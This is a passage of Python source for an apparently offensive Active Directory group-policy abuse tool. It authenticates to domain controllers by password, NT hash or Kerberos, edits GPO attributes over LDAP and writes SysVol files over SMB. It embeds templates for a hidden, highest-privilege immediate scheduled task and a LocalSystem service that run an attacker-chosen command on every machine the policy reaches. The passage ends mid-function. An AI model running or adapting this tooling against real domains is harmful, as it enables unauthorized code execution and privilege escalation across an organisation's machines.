#!/usr/bin/env python
# GPO helper
# Author: Juan Manuel Fernandez (@TheXC3LL)


import os
import sys
import argparse
import logging
import ldap3
import uuid
from impacket.smbconnection import SMBConnection
from datetime import datetime
import ssl
from impacket.spnego import SPNEGO_NegTokenInit, TypesMech
from binascii import unhexlify

class GPOhelper:
    def __init__(self, username, password, domain, lmhash, nthash, dcHost, scope, context, kerberos, aesKey, options):
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = lmhash
        self.__nthash = nthash
        self.__dcHost = dcHost
        self.__k = kerberos
        self.__aesKey = aesKey
        self.__options = options

        self.ldapconn = ''
        self.ldaprecords = []

        self.smbconn = ''

        if scope == "gPCUserExtensionNames":
            self.gpoattr = scope
            self.gpopath = "User"
        elif scope == "gPCMachineExtensionNames":
            self.gpoattr = scope
            self.gpopath = "Machine"

        self.context = context

        # From GetADUsers.py - Create BaseDN
        domainParts = self.__domain.split('.')
        self.baseDN = ''
        for i in domainParts:
            self.baseDN += 'dc=%s,' % i
        self.baseDN = self.baseDN[:-1]

        self.ms_gppref = {
            "{00000000-0000-0000-0000-000000000000}" : "Core GPO Engine",
            "{0ACDD40C-75AC-47AB-BAA0-BF6DE7E7FE63}" : "Wireless Group Policy",
            "{0E28E245-9368-4853-AD84-6DA3BA35BB75}" : "Group Policy Environment",
            "{0F3F3735-573D-9804-99E4-AB2A69BA5FD4}" : "Computer Policy Setting",
            "{0F6B957D-509E-11D1-A7CC-0000F87571E3}" : "Tool Extension GUID (Computer Policy Settings)",
            "{0F6B957E-509E-11D1-A7CC-0000F87571E3}" : "Tool Extension GUID (User Policy Settings) Restrict Run",
            "{1612B55C-243C-48DD-A449-FFC097B19776}" : "Data Sources",
            "{16BE69FA-4209-4250-88CB-716CF41954E0}" : "Central Access Policy Configuration",
            "{17D89FEC-5C44-4972-B12D-241CAEF74509}" : "Group Policy Local Users and Groups",
            "{1A6364EB-776B-4120-ADE1-B63A406A76B5}" : "Group Policy Device Settings",
            "{1B767E9A-7BE4-4D35-85C1-2E174A7BA951}" : "Devices",
            "{25537BA6-77A8-11D2-9B6C-0000F8080861}" : "Folder Redirection",
            "{2A8FDC61-2347-4C87-92F6-B05EB91A201A}" : "MitigationOptions",
            "{2EA1A81B-48E5-45E9-8BB7-A6E3AC170006}" : "Drives",
            "{3060E8CE-7020-11D2-842D-00C04FA372D4}" : "Remote Installation Services",
            "{346193F5-F2FD-4DBD-860C-B88843475FD3}" : "ConfigMgr User State Management Extension",
            "{35141B6B-498A-4CC7-AD59-CEF93D89B2CE}" : "Environment Variables",
            "{35378EAC-683F-11D2-A89A-00C04FBBCFA2}" : "Registry Settings",
            "{3610EDA5-77EF-11D2-8DC5-00C04FA31A66}" : "Microsoft Disk Quota",
            "{3A0DBA37-F8B2-4356-83DE-3E90BD5C261F}" : "Group Policy Network Options",
            "{3BAE7E51-E3F4-41D0-853D-9BB9FD47605F}" : "Files",
            "{3BFAE46A-7F3A-467B-8CEA-6AA34DC71F53}" : "Folder Options",
            "{3EC4E9D3-714D-471F-88DC-4DD4471AAB47}" : "Folders",
            "{40B6664F-4972-11D1-A7CA-0000F87571E3}" : "Scripts (Startup/Shutdown)",
            "{40B66650-4972-11D1-A7CA-0000F87571E3}" : "Scripts (Logon/Logoff) Run Restriction",
            "{426031C0-0B47-4852-B0CA-AC3D37BFCB39}" : "QoS Packet Scheduler",
            "{42B5FAAE-6536-11D2-AE5A-0000F87571E3}" : "Scripts",
            "{47BA4403-1AA0-47F6-BDC5-298F96D1C2E3}" : "Print Policy in PolicyMaker",
            "{4BCD6CDE-777B-48B6-9804-43568E23545D}" : "Remote Desktop USB Redirection",
            "{4CFB60C1-FAA6-47F1-89AA-0B18730C9FD3}" : "Internet Explorer Zonemapping",
            "{4D2F9B6F-1E52-4711-A382-6A8B1A003DE6}" : "RADCProcessGroupPolicyEx",
            "{4D968B55-CAC2-4FF5-983F-0A54603781A3}" : "Work Folders",
            "{516FC620-5D34-4B08-8165-6A06B623EDEB}" : "Ini Files",
            "{53D6AB1B-2488-11D1-A28C-00C04FB94F17}" : "EFS Policy",
            "{53D6AB1D-2488-11D1-A28C-00C04FB94F17}" : "Certificates Run Restriction",
            "{5794DAFD-BE60-433F-88A2-1A31939AC01F}" : "Group Policy Drive Maps",
            "{5C935941-A954-4F7C-B507-885941ECE5C4}" : "Internet Settings",
            "{6232C319-91AC-4931-9385-E70C2B099F0E}" : "Group Policy Folders",
            "{6A4C88C6-C502-4F74-8F60-2CB23EDC24E2}" : "Group Policy Network Shares",
            "{7150F9BF-48AD-4DA4-A49C-29EF4A8369BA}" : "Group Policy Files",
            "{728EE579-943C-4519-9EF7-AB56765798ED}" : "Group Policy Data Sources",
            "{74EE6C03-5363-4554-B161-627540339CAB}" : "Group Policy Ini Files",
            "{7933F41E-56F8-41D6-A31C-4148A711EE93}" : "Windows Search Group Policy Extension",
            "{79F92669-4224-476C-9C5C-6EFB4D87DF4A}" : "Local users and groups",
            "{7B849A69-220F-451E-B3FE-2CB811AF94AE}" : "Internet Explorer User Accelerators",
            "{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}" : "Computer Restricted Groups",
            "{827D319E-6EAC-11D2-A4EA-00C04F79F83A}" : "Security",
            "{88E729D6-BDC1-11D1-BD2A-00C04FB9603F}" : "Folder Redirection",
            "{8A28E2C5-8D06-49A4-A08C-632DAA493E17}" : "Deployed Printer Configuration",
            "{91FBB303-0CD5-4055-BF42-E512A681B325}" : "Group Policy Services",
            "{942A8E4F-A261-11D1-A760-00C04FB9603F}" : "Software Installation (Computers)",
            "{949FB894-E883-42C6-88C1-29169720E8CA}" : "Network Options",
            "{9AD2BAFE-63B4-4883-A08C-C3C6196BCAFD}" : "Power Options",
            "{A2E30F80-D7DE-11D2-BBDE-00C04F86AE3B}" : "Internet Explorer Branding",
            "{A3F3E39B-5D83-4940-B954-28315B82F0A8}" : "Group Policy Folder Options",
            "{A8C42CEA-CDB8-4388-97F4-5831F933DA84}" : "Printers",
            "{AADCED64-746C-4633-A97C-D61349046527}" : "Group Policy Scheduled Tasks",
            "{B05566AC-FE9C-4368-BE01-7A4CBB6CBA11}" : "Windows Firewall",
            "{B087BE9D-ED37-454F-AF9C-04291E351182}" : "Group Policy Registry",
            "{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}" : "EFS Recovery",
            "{B587E2B1-4D59-4E7E-AED9-22B9DF11D053}" : "802.3 Group Policy",
            "{B9CCA4DE-E2B9-4CBD-BF7D-11B6EBFBDDF7}" : "Regional Options",
            "{BA649533-0AAC-4E04-B9BC-4DBAE0325B12}" : "Windows To Go Startup Options",
            "{BACF5C8A-A3C7-11D1-A760-00C04FB9603F}" : "Software Installation (Users) Run Restriction",
            "{BC75B1ED-5833-4858-9BB8-CBF0B166DF9D}" : "Group Policy Printers",
            "{BEE07A6A-EC9F-4659-B8C9-0B1937907C83}" : "Registry",
            "{BFCBBEB0-9DF4-4C0C-A728-434EA66A0373}" : "Network Shares",
            "{C34B2751-1CF4-44F5-9262-C3FC39666591}" : "Windows To Go Hibernate Options",
            "{C418DD9D-0D14-4EFB-8FBF-CFE535C8FAC7}" : "Group Policy Shortcuts",
            "{C631DF4C-088F-4156-B058-4375F0853CD8}" : "Microsoft Offline Files",
            "{C6DC5466-785A-11D2-84D0-00C04FB169F7}" : "Software Installation",
            "{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}" : "Scheduled Tasks",
            "{CC5746A9-9B74-4BE5-AE2E-64379C86E0E4}" : "Services",
            "{CDEAFC3D-948D-49DD-AB12-E578BA4AF7AA}" : "TCPIP",
            "{CEFFA6E2-E3BD-421B-852C-6F6A79A59BC1}" : "Shortcuts",
            "{CF7639F3-ABA2-41DB-97F2-81E2C5DBFC5D}" : "Internet Explorer Machine Accelerators",
            "{CF848D48-888D-4F45-B530-6A201E62A605}" : "Start Menu",
            "{D02B1F72-3407-48AE-BA88-E8213C6761F1}" : "Tool Extension GUID (Computer Policy Settings)",
            "{D02B1F73-3407-48AE-BA88-E8213C6761F1}" : "Tool Extension GUID (User Policy Settings)",
            "{D76B9641-3288-4F75-942D-087DE603E3EA}" : "AdmPwd (LAPS)",
            "{E437BC1C-AA7D-11D2-A382-00C04F991E27}" : "IP Security",
            "{E47248BA-94CC-49C4-BBB5-9EB7F05183D0}" : "Group Policy Internet Settings",
            "{E4F48E54-F38D-4884-BFB9-D4D2E5729C18}" : "Group Policy Start Menu Settings",
            "{E5094040-C46C-4115-B030-04FB2E545B00}" : "Group Policy Regional Options",
            "{E62688F0-25FD-4C90-BFF5-F508B9D2E31F}" : "Group Policy Power Options",
            "{F0DB2806-FD46-45B7-81BD-AA3744B32765}" : "Policy Maker",
            "{F17E8B5B-78F2-49A6-8933-7B767EDA5B41}" : "Policy Maker",
            "{F27A6DA8-D22B-4179-A042-3D715F9E75B5}" : "Policy Maker",
            "{F312195E-3D9D-447A-A3F5-08DFFA24735E}" : "ProcessVirtualizationBasedSecurityGroupPolicy",
            "{F3CCC681-B74C-4060-9F26-CD84525DCA2A}" : "Audit Policy Configuration",
            "{F581DAE7-8064-444A-AEB3-1875662A61CE}" : "Policy Maker",
            "{F648C781-42C9-4ED4-BB24-AEB8853701D0}" : "Policy Maker",
            "{F6E72D5A-6ED3-43D9-9710-4440455F6934}" : "Policy Maker",
            "{F9C77450-3A41-477E-9310-9ACD617BD9E3}" : "Group Policy Applications",
            "{FB2CA36D-0B40-4307-821B-A13B252DE56C}" : "Policy-based QoS",
            "{FBF687E6-F063-4D9F-9F4F-FD9A26ACDD5F}" : "Connectivity Platform",
            "{FC491EF1-C4AA-4CE1-B329-414B101DB823}" : "ProcessConfigCIPolicyGroupPolicy",
            "{FC715823-C5FB-11D1-9EEF-00A0C90347FF}" : "Internet Explorer Maintenance Extension protocol",
            "{FD2D917B-6519-4BF7-8403-456C0C64312F}" : "Policy Maker",
            "{FFC64763-70D2-45BC-8DEE-7ACAF1BA7F89}" : "Policy Maker"

            #https://github.com/zloeber/PSAD/blob/fcf2936b79b5e49c99f09cea96fbafd26e6ecbf2/src/other/CSEGUIDMap.csv
        }


        self.tmpName = "/tmp/GPOwned.tmp"

        self.template_file_new = '<?xml version="1.0" encoding="utf-8"?><Files clsid="{215B2E53-57CE-475c-80FE-9EEC14635851}"></Files>'
        self.template_file = '<File clsid="{50BE44C8-567A-4ed1-B1D0-9234FE1F38AF}" name="CHANGEME_NAME" status="CHANGEME_NAME" image="0" changed="CHANGEME_TIMESTAMP" uid="{CHANGEME_UID}" userContext="CHANGEME_CONTEXT"><Properties action="C" fromPath="CHANGEME_FROMPATH" targetPath="CHANGEME_TOPATH" readOnly="0" archive="1" hidden="CHANGEME_HIDDEN"/></File></Files>'

        self.template_folder_new = '<?xml version="1.0" encoding="utf-8"?><Folders clsid="{77CC39E7-3D16-4f8f-AF86-EC0BBEE2C861}"></Folders>'
        self.template_folder = '<Folder clsid="{07DA02F5-F9CD-4397-A550-4AE21B6B4BD3}" name="CHANGEME_NAME" status="CHANGEME_NAME" image="0" changed="CHANGEME_TIMESTAMP" uid="{CHANGEME_UID}" userContext="CHANGEME_CONTEXT"><Properties action="C" path="CHANGEME_PATH" readOnly="0" archive="1" hidden="CHANGEME_HIDDEN"/></Folder></Folders>'

        self.template_registry_new = '<?xml version="1.0" encoding="utf-8"?><RegistrySettings clsid="{A3CCFC41-DFDB-43a5-8D26-0FE8B954DA51}"></RegistrySettings>'
        self.template_registry = '<Registry clsid="{9CD4B2F4-923D-47f5-A062-E897DD1DAD50}" name="CHANGEME_NAME" status="CHANGEME_STATUS" image="5" changed="CHANGEME_TIMESTAMP" uid="{CHANGEME_UID}" userContext="CHANGEME_CONTEXT"><Properties action="C" displayDecimal="1" default="CHANGEME_DEFAULT" hive="CHANGEME_HIVE" key="CHANGEME_KEY" name="CHANGEME_SUBKEY" type="CHANGEME_TYPE" value="CHANGEME_VALUE"/></Registry></RegistrySettings>'

        self.template_service_new = '<?xml version="1.0" encoding="utf-8"?><NTServices clsid="{2CFB484A-4E96-4b5d-A0B6-093D2F91E6AE}"></NTServices>'
        self.template_service = '<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}" name="CHANGEME_NAME" image="2" changed="CHANGEME_TIMESTAMP" uid="{CHANGEME_UID}" userContext="CHANGEME_CONTEXT"><Properties startupType="AUTOMATIC" serviceName="CHANGEME_NAME" serviceAction="CHANGEME_ACTION" timeout="30" accountName="LocalSystem" interact="0"/></NTService></NTServices>'

        self.template_task_new = '<?xml version="1.0" encoding="utf-8"?><ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}"></ScheduledTasks>'
        self.template_task = '<ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="CHANGEME_TASKNAME" image="0" changed="CHANGEME_TIMESTAMP" uid="{CHANGEME_UID}" userContext="CHANGEME_CONTEXT" removePolicy="0"><Properties action="C" name="CHANGEME_TASKNAME" runAs="CHANGEME_USER" logonType="S4U"><Task version="1.2"><RegistrationInfo><Author>CHANGEME_AUTHOR</Author><Description>CHANGEME_DESCRIPTION</Description></RegistrationInfo><Principals><Principal id="Author"><UserId>CHANGEME_USER</UserId><LogonType>S4U</LogonType><RunLevel>HighestPrivilege</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT5M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>false</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><AllowStartOnDemand>false</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context="Author"><Exec><Command>CHANGEME_LOCATION</Command></Exec></Actions></Task></Properties></ImmediateTaskV2></ScheduledTasks>'

    def ldap3_kerberos_login(self,connection, target, user, password, domain='', lmhash=None, nthash=None, aesKey='', kdcHost=None,
                            TGT=None, TGS=None, useCache=True):
        from pyasn1.codec.ber import encoder, decoder
        from pyasn1.type.univ import noValue
        """
        logins into the target system explicitly using Kerberos. Hashes are used if RC4_HMAC is supported.
        :param string user: username
        :param string password: password for the user
        :param string domain: domain where the account is valid for (required)
        :param string lmhash: LMHASH used to authenticate using hashes (password is not used)
        :param string nthash: NTHASH used to authenticate using hashes (password is not used)
        :param string aesKey: aes256-cts-hmac-sha1-96 or aes128-cts-hmac-sha1-96 used for Kerberos authentication
        :param string kdcHost: hostname or IP Address for the KDC. If None, the domain will be used (it needs to resolve tho)
        :param struct TGT: If there's a TGT available, send the structure here and it will be used
        :param struct TGS: same for TGS. See smb3.py for the format
        :param bool useCache: whether or not we should use the ccache for credentials lookup. If TGT or TGS are specified this is False
        :return: True, raises an Exception if error.
        """
        if lmhash != '' or nthash != '':
            if len(lmhash) % 2:
                lmhash = '0' + lmhash
            if len(nthash) % 2:
                nthash = '0' + nthash
            try:  # just in case they were converted already
                lmhash = unhexlify(lmhash)
                nthash = unhexlify(nthash)
            except TypeError:
                pass

        # Importing down here so pyasn1 is not required if kerberos is not used.
        from impacket.krb5.ccache import CCache
        from impacket.krb5.asn1 import AP_REQ, Authenticator, TGS_REP, seq_set
        from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
        from impacket.krb5 import constants
        from impacket.krb5.types import Principal, KerberosTime, Ticket
        import datetime

        if TGT is not None or TGS is not None:
            useCache = False

        target = 'ldap/%s' % target
        if useCache:
            domain, user, TGT, TGS = CCache.parseFile(domain, user, target)

        # First of all, we need to get a TGT for the user
        userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        if TGT is None:
            if TGS is None:
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, password, domain, lmhash, nthash,
                                                                        aesKey, kdcHost)
        else:
            tgt = TGT['KDC_REP']
            cipher = TGT['cipher']
            sessionKey = TGT['sessionKey']

        if TGS is None:
            serverName = Principal(target, type=constants.PrincipalNameType.NT_SRV_INST.value)
            tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, kdcHost, tgt, cipher,
                                                                    sessionKey)
        else:
            tgs = TGS['KDC_REP']
            cipher = TGS['cipher']
            sessionKey = TGS['sessionKey']

            # Let's build a NegTokenInit with a Kerberos REQ_AP

        blob = SPNEGO_NegTokenInit()

        # Kerberos
        blob['MechTypes'] = [TypesMech['MS KRB5 - Microsoft Kerberos 5']]

        # Let's extract the ticket from the TGS
        tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
        ticket = Ticket()
        ticket.from_asn1(tgs['ticket'])

        # Now let's build the AP_REQ
        apReq = AP_REQ()
        apReq['pvno'] = 5
        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

        opts = []
        apReq['ap-options'] = constants.encodeFlags(opts)
        seq_set(apReq, 'ticket', ticket.to_asn1)

        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = domain
        seq_set(authenticator, 'cname', userName.components_to_asn1)
        now = datetime.datetime.utcnow()

        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)

        encodedAuthenticator = encoder.encode(authenticator)

        # Key Usage 11
        # AP-REQ Authenticator (includes application authenticator
        # subkey), encrypted with the application session key
        # (Section 5.5.1)
        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 11, encodedAuthenticator, None)

        apReq['authenticator'] = noValue
        apReq['authenticator']['etype'] = cipher.enctype
        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

        blob['MechToken'] = encoder.encode(apReq)

        request = ldap3.operation.bind.bind_operation(connection.version, ldap3.SASL, user, None, 'GSS-SPNEGO',
                                                    blob.getData())

        # Done with the Kerberos saga, now let's get into LDAP
        if connection.closed:  # try to open connection if closed
            connection.open(read_server_info=False)

        connection.sasl_in_progress = True
        response = connection.post_send_single_response(connection.send('bindRequest', request, None))
        connection.sasl_in_progress = False
        if response[0]['result'] != 0:
            raise Exception(response)

        connection.bound = True

        return True

    def conn2ldap(self,tls_version, target):
        print("[*] Connecting to LDAP service at %s" % self.__dcHost)
        user = '%s\\%s' % (self.__domain, self.__username)
        connect_to = self.__dcHost
        if self.__dcHost is not None:
            connect_to = self.__dcHost
        if tls_version is not None:
            use_ssl = True
            port = 636
            tls = ldap3.Tls(validate=ssl.CERT_NONE, version=tls_version)
        else:
            use_ssl = False
            port = 389
            tls = None
        ldap_server = ldap3.Server(connect_to, get_info=ldap3.ALL, port=port, use_ssl=use_ssl, tls=tls)
        if self.__k:
            self.ldapconn = ldap3.Connection(ldap_server)
            self.ldapconn.bind()
            if self.__nthash == None and self.__lmhash == None:
                self.__nthash = ''
                self.__lmhash = ''
            self.ldap3_kerberos_login(self.ldapconn, target, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey, self.__dcHost)
        elif self.__nthash is not None:
            self.__lmhash = "aad3b435b51404eeaad3b435b51404ee"
            self.ldapconn = ldap3.Connection(ldap_server, user=user, password=self.__lmhash + ":" + self.__nthash, authentication=ldap3.NTLM, auto_bind=True)
        else:
            self.ldapconn = ldap3.Connection(ldap_server, user=user, password=self.__password, authentication=ldap3.NTLM, auto_bind=True)

    def conn2smb(self):
        print("[*] Connecting to SMB service at %s" % self.__dcHost)
        try:
            smbClient = SMBConnection(self.__dcHost, self.__dcHost, sess_port=445)
            if self.__nthash == None and self.__lmhash == None:
                self.__nthash = ''
                self.__lmhash = ''
            if self.__k:
                smbClient.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey, self.__dcHost)           
            else:
                smbClient.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
            self.smbconn = smbClient
        except:
            raise

    def SMBReadFile(self, path):
        print("[*] Reading %s " % path)
        fh = open(self.tmpName, "w+b")
        self.smbconn.getFile('SysVol', path, fh.write)
        fh.seek(0)
        data = fh.read()
        fh.close()
        return data

    def SMBDownloadRecursive(self, path, dst):
        if "sysvol" in path.lower():
            path = self.fixPath(path)
        print("[*] Enumerating files at \\SysVol%s" % path)
        files = self.smbconn.listPath('SysVol', path + "/*")
        for f in files:
            current = path + "/" + f.get_longname()
            if f.is_directory() > 0:
                if f.get_longname() != "." and f.get_longname() != "..":
                    os.mkdir(dst + path[path.index("}") + 1:] + "/" + f.get_longname())
                    recursion = self.SMBDownloadRecursive(current, dst)
            else:
                fh = open(dst + path[path.index("}") + 1:] + "/" + f.get_longname(), "wb")
                print("[*] Downloading \\Sysvol%s" % current)
                self.smbconn.getFile('SysVol', current, fh.write)

    def SMBWriteFile(self, path, content):
        print("[*] Writing %s" % path)
        fh = open(self.tmpName, "w+b")
        fh.write(content)
        fh.seek(0)
        self.smbconn.putFile('SysVol', path, fh.read)
        fh.close()

    def SMBUploadFile(self, localPath, remotePath):
        print("[*] Uploading %s to %s" % (localPath, remotePath))
        fh = open(localPath, "rb")
        self.smbconn.putFile('SysVol', remotePath, fh.read)
        fh.close()


    def GUID2info(self, guids):
        guids = str(guids)
        info = []
        while 1:
            try:
                sep1 = guids.index("[")
                sep2 = guids.index("]") + 1
                tmp = guids[sep1:sep2]
                verb = []
                while 1:
                    try:
                        sepa = tmp.index("{")
                        sepb = tmp.index("}") + 1
                        guid = tmp[sepa:sepb]
                        verb.append(self.ms_gppref[guid])
                        tmp = tmp[sepb:]
                    except:
                        info.append(verb)
                        break
                guids = guids[sep2:]
            except:
                break
        return info

    def info2GUID(self, info):
        guids_list = list(self.ms_gppref.keys())
        info_list = list(self.ms_gppref.values())
        guids = []
        for x in info:
            tmp = []
            for y in x:
                tmp.append(guids_list[info_list.index(y)])
            guids.append(tmp)
        return guids

    def GUID2str(self, guids):
        strguid = ''
        for x in guids:
            strguid = strguid + '['
            for y in x:
                strguid = strguid + y
            strguid = strguid + "]"
        return strguid

    def generateGUID(self):
        return str(uuid.uuid4()).upper()

    def updateGUID(self, info, action, policies, dn):
        if action != "":
            info[0].append(action)
        tmp = policies
        info.append(tmp)
        guids = self.info2GUID(info)
        strguids = self.GUID2str(guids)
        print("[*] Updating " + self.gpoattr)
        self.ldapconn.modify(dn, {self.gpoattr:(ldap3.MODIFY_REPLACE, [strguids])})
        if self.ldapconn.result['result'] != 0:
            raise

    def extractInfo(self, gpo):
        gpoInfo = self.ldapGPOInfo("*", gpo)
        dn = gpoInfo[0]["dn"]
        origPath = str(gpoInfo[0]["gPCFileSysPath"])
        path = self.fixPath(origPath)
        info = self.GUID2info(gpoInfo[0][self.gpoattr])
        ret = (path, info, dn)
        return ret

    def ldapQuery(self, searchFilter, attributes, prefix=''):

        base = self.ldapconn.server.info.other['defaultNamingContext'][0]

        if prefix:

            base = prefix + base

        return self.ldapconn.search(base, searchFilter, attributes=attributes)

    def ldapGPOFromSiteInfo(self,name):
        target = self.get_machine_name(self.__options, self.__domain)       
        dn_prefix = "CN=Sites,CN=Configuration,"
        searchFilter = "(&(objectCategory=site)(name=%s))" % (name)
        if self.ldapconn == '':
            if self.__options.use_ldaps is True:
                try:
                    self.conn2ldap(ssl.PROTOCOL_TLSv1_2, target)
                except ldap3.core.exceptions.LDAPSocketOpenError:
                    self.conn2ldap(ssl.PROTOCOL_TLSv1, target)
            else:
                self.conn2ldap(None, target)
        print("[*] Requesting GPOs SITE info from LDAP")
        self.ldaprecords = []
        retvalue = self.ldapQuery(searchFilter, ldap3.ALL_ATTRIBUTES, dn_prefix)
        if retvalue != True:
                raise
        entries = self.ldapconn.entries
        for entry in entries:
            try:
                tmp = {
                    'dn' : entry.entry_dn,
                    'Name' : entry["name"],
                    'distinguishedName' : entry["distinguishedName"],
                    'gPLink' : entry["gPLink"],
                    'objectGUID' : entry["objectGUID"],
                    'objectcategory' : entry["objectcategory"]
                }
            except ldap3.core.exceptions.LDAPKeyError:
                tmp = {
                    'dn' : entry.entry_dn,
                    'Name' : entry["name"],
                    'distinguishedName' : entry["distinguishedName"],
                    'gPLink' : None,
                    'objectGUID' : entry["objectGUID"],
                    'objectcategory' : entry["objectcategory"]
                }               
            self.ldaprecords.append(tmp)
        return self.ldaprecords
    
    def ldapGPOFromOUInfo(self,name):
        target = self.get_machine_name(self.__options, self.__domain)
        searchFilter = "(&(objectCategory=organizationalUnit)(name=%s))" % (name)
        if self.ldapconn == '':
            if self.__options.use_ldaps is True:
                try:
                    self.conn2ldap(ssl.PROTOCOL_TLSv1_2, target)
                except ldap3.core.exceptions.LDAPSocketOpenError:
                    self.conn2ldap(ssl.PROTOCOL_TLSv1, target)
            else:
                self.conn2ldap(None, target)
        print("[*] Requesting GPOs OU info from LDAP")
        self.ldaprecords = []
        retvalue = self.ldapQuery(searchFilter, ldap3.ALL_ATTRIBUTES)
        if retvalue != True:
                raise
        entries = self.ldapconn.entries
        for entry in entries:
            try:
                tmp = {
                    'dn' : entry.entry_dn,
                    'Name' : entry["name"],
                    'distinguishedName' : entry["distinguishedName"],
                    'gPLink' : entry["gPLink"],
                    'objectGUID' : entry["objectGUID"],
                    'objectcategory' : entry["objectcategory"]
                }
            except ldap3.core.exceptions.LDAPKeyError:
                tmp = {
                    'dn' : entry.entry_dn,
                    'Name' : entry["name"],
                    'distinguishedName' : entry["distinguishedName"],
                    'gPLink' : None,
                    'objectGUID' : entry["objectGUID"],
                    'objectcategory' : entry["objectcategory"]
                }                
            self.ldaprecords.append(tmp)
        return self.ldaprecords
    
    def DomainToDN(self,domain):
        parts = domain.split('.')
        dn = ','.join([f'DC={part}' for part in parts])
        return dn      

    def ldapGPOFromDomainInfo(self,name):
        target = self.get_machine_name(self.__options, self.__domain)
        domain_dn = self.DomainToDN(self.__domain)
        searchFilter = "(&(objectClass=*)(distinguishedname=%s))" % domain_dn
        if self.ldapconn == '':
            if self.__options.use_ldaps is True:
                try:
                    self.conn2ldap(ssl.PROTOCOL_TLSv1_2, target)
                except ldap3.core.exceptions.LDAPSocketOpenError:
                    self.conn2ldap(ssl.PROTOCOL_TLSv1, target)
            else:
                self.conn2ldap(None, target)
        print("[*] Requesting GPOs Domain info from LDAP")
        self.ldaprecords = []
        retvalue = self.ldapQuery(searchFilter, ldap3.ALL_ATTRIBUTES)
        if retvalue != True:
                raise
        entries = self.ldapconn.entries
        for entry in entries:
            try:
                tmp = {
                    'dn' : entry.entry_dn,
                    'Name' : entry["name"],
                    'distinguishedName' : entry["distinguishedName"],
                    'gPLink' : entry["gPLink"],
                    'objectGUID' : entry["objectGUID"],
                    'objectcategory' : entry["objectcategory"]
                }
            except ldap3.core.exceptions.LDAPKeyError:
                tmp = {
                    'dn' : entry.entry_dn,
                    'Name' : entry["name"],
                    'distinguishedName' : entry["distinguishedName"],
                    'gPLink' : None,
                    'objectGUID' : entry["objectGUID"],
                    'objectcategory' : entry["objectcategory"]
                }                
            self.ldaprecords.append(tmp)
        return self.ldaprecords           

    def ldapGPOInfo(self, displayname, name):
        target = self.get_machine_name(self.__options, self.__domain)
        #searchFilter = "(&(objectCategory=groupPolicyContainer)(displayName=%s)(name=%s)(%s=*))" % (displayname, name, self.gpoattr) old query did not returned all the gpos
        searchFilter = "(&(objectCategory=groupPolicyContainer)(displayName=%s)(name=%s))" % (displayname, name)
        if self.ldapconn == '':
            if self.__options.use_ldaps is True:
                try:
                    self.conn2ldap(ssl.PROTOCOL_TLSv1_2, target)
                except ldap3.core.exceptions.LDAPSocketOpenError:
                    self.conn2ldap(ssl.PROTOCOL_TLSv1, target)
            else:
                self.conn2ldap(None, target)

        print("[*] Requesting GPOs info from LDAP")
        self.ldaprecords = []
        retvalue = self.ldapQuery(searchFilter, ldap3.ALL_ATTRIBUTES)
        if retvalue != True:
                raise
        entries = self.ldapconn.entries
        for entry in entries:
            try:
                tmp = {
                    'dn' : entry.entry_dn,
                    'Name' : entry["name"],
                    'displayName' : entry["displayName"],
                    'gPCFileSysPath' : entry["gPCFileSysPath"],
                    self.gpoattr : entry[self.gpoattr],
                    'versionNumber' : entry["versionNumber"]
                }
            except ldap3.core.exceptions.LDAPKeyError:
                tmp = {
                    'dn' : entry.entry_dn,
                    'Name' : entry["name"],
                    'displayName' : entry["displayName"],
                    'gPCFileSysPath' : entry["gPCFileSysPath"],
                    self.gpoattr : None,
                    'versionNumber' : entry["versionNumber"]
                }                
            self.ldaprecords.append(tmp)
        return self.ldaprecords

    def ldapGplinkInfo(self, ou, gpo):
        target = self.get_machine_name(self.__options, self.__domain)
        searchFilter = "(&(gPLink=%s)(name=%s))" % (gpo, ou)
        if self.ldapconn == '':
            if self.__options.use_ldaps is True:
                try:
                    self.conn2ldap(ssl.PROTOCOL_TLSv1_2, target)
                except ldap3.core.exceptions.LDAPSocketOpenError:
                    self.conn2ldap(ssl.PROTOCOL_TLSv1, target)
            else:
                self.conn2ldap(None, target)
        print("[*] Requesting GPOs info from LDAP")
        self.ldaprecords = []
        retvalue = self.ldapQuery(searchFilter, ['distinguishedName', 'gPLink', 'name'])
        if retvalue != True:
                raise
        entries = self.ldapconn.entries
        for entry in entries:
            tmp = {
                'Name' : entry["name"],
                'dn' : entry["distinguishedName"],
                'gPLink' : entry["gPLink"],
            }
            self.ldaprecords.append(tmp)
        return self.ldaprecords

    def fixPath(self, path):
        path = path.lower()
